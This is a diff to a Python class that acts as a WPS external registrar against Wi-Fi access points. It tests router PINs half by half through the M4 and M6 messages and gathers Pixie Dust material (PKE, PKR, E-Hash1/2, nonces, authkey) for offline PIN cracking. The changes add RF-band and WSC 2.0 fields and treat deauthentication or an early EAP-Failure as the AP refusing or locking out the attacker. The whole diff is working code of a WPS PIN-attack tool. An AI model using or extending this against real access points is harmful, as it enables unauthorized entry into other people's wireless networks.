@@ -130,6 +130,8 @@ class WpsRegistrar:
         transport: WpsTransport,
         bssid: bytes,
         our_mac: bytes,
+        channel: int,
+        wsc_2_0: bool,
         msg_timeout: float = 3.0,
         eapol_start_timeout: float = 7.0,
         overall_timeout: float = 25.0,
@@ -145,6 +147,8 @@ class WpsRegistrar:
         self.t = transport
         self.bssid = bssid
         self.our_mac = our_mac
+        self.rf_bands = M.rf_band_for_channel(channel)
+        self.wsc_2_0 = wsc_2_0
         # Per-message receive window. A cheap AP can take seconds to compute the
         # next WSC message (DH ≈ 1.2s measured; M1 up to ~3.4s on the AirLink), so
         # these are deliberately generous. A window shorter than the AP's real
@@ -161,7 +165,7 @@ class WpsRegistrar:
         # before moving on, instead of shot-and-prayed.
         self.tx_ack = tx_ack
         self.ack_resends = ack_resends
-        self.log = log or logger.debug
+        self.log = log or logger.info
         self._last_1x_frame: Optional[bytes] = None
 
     async def _send_1x(self, payload_1x: bytes) -> None:
@@ -195,7 +199,6 @@ class WpsRegistrar:
         self._last_1x_frame = None
         identity_reqs = 0            # count EAP-Req/Identity: detect the "stuck at identity" stall
         nonwsc_seen: set = set()    # distinct non-WSC frame kinds the AP sent (logged once each)
-        disassoc_why: Optional[str] = None   # set if AP kicked us (mgmt DISASSOC/DEAUTH) + why
 
         def _out(result: PinResult, **kw) -> AttemptOutcome:
             # Every outcome carries reached_m1 so the campaign can tell a silent AP
@@ -239,8 +242,6 @@ class WpsRegistrar:
                              "(timeout-as-NACK)")
                     return _out(PinResult.SECOND_HALF_WRONG, detail="no reply after M6",
                                 via_timeout=True)
-                if disassoc_why is not None:
-                    return _out(PinResult.TIMEOUT, detail=f"disassoc ({disassoc_why})", refused=True)
                 if identity_reqs >= _IDENTITY_STALL:
                     return _out(PinResult.TIMEOUT, refused=True,
                                 detail=f"stalled at ID {identity_reqs}x, no M1")
@@ -264,7 +265,12 @@ class WpsRegistrar:
                              if kind in ("mgmt/DISASSOC", "mgmt/DEAUTH") else "")
                     self.log(f"[WPS] <- {tag}{extra} from AP ({len(frame)}B): {frame[:56].hex()}")
                 if kind in ("mgmt/DISASSOC", "mgmt/DEAUTH"):
-                    disassoc_why = disassoc_reason(frame)
+                    # The association is gone: resending into it only earns more
+                    # class-2/3 kicks, and no PIN verdict can be read off a dead link.
+                    # Before M1 this is the AP refusing an external registrar outright.
+                    return _out(PinResult.TIMEOUT, refused=not reached_m1,
+                                detail=f"{kind.removeprefix('mgmt/').lower()} "
+                                       f"({disassoc_reason(frame)})")
                 continue
 
             if p.is_identity_request:
@@ -294,8 +300,11 @@ class WpsRegistrar:
                 if last_sent == "M6":
                     return _out(PinResult.SECOND_HALF_WRONG, detail="NACK after M6",
                                 config_error=config_error)
-                return _out(PinResult.PROTO_ERROR, detail="NACK before PIN answer",
-                            config_error=config_error)
+                # An EAP-Failure before M1 is the AP's authenticator refusing an
+                # external registrar (locked / no AP PIN), not an in-protocol NACK.
+                return _out(PinResult.PROTO_ERROR, detail=f"{kind} before PIN answer",
+                            config_error=config_error,
+                            refused=p.is_eap_failure and not reached_m1)
 
             mt = p.wsc_msg_type
             if mt and mt < highest_mt:
@@ -317,7 +326,8 @@ class WpsRegistrar:
                 shared = wc.dh_shared_secret(pke, priv)
                 authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                 psk1, psk2 = wc.derive_psk(authkey, pin)
-                m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey, p.raw_wsc_attrs)
+                m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey, p.raw_wsc_attrs,
+                                self.rf_bands, self.wsc_2_0)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m2))
                 self.log(f"[WPS] <- M1 (id {p.eap_id}, {len(p.raw_wsc_attrs)}B); -> M2")
 
@@ -329,14 +339,15 @@ class WpsRegistrar:
                 if e_hash1 and e_hash2:
                     pixie = PixieBundle(pke, pkr, e_hash1, e_hash2, nonce_e, authkey, mac_e)
                 m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
-                                authkey, keywrapkey, p.raw_wsc_attrs)
+                                authkey, keywrapkey, p.raw_wsc_attrs, self.wsc_2_0)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
                 last_sent = "M4"
                 self.log(f"[WPS] <- M3 (id {p.eap_id}); -> M4 (revealing R-S1, testing first half)")
 
             elif mt == M.WPS_M5:
                 # First half accepted. Reveal R-S2 in M6 to test the second half.
-                m6 = M.build_m6(nonce_e, r_s2, authkey, keywrapkey, p.raw_wsc_attrs)
+                m6 = M.build_m6(nonce_e, r_s2, authkey, keywrapkey, p.raw_wsc_attrs,
+                                self.wsc_2_0)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m6))
                 last_sent = "M6"
                 self.log(f"[WPS] <- M5 (id {p.eap_id}) -> first half CORRECT; -> M6 (testing second half)")
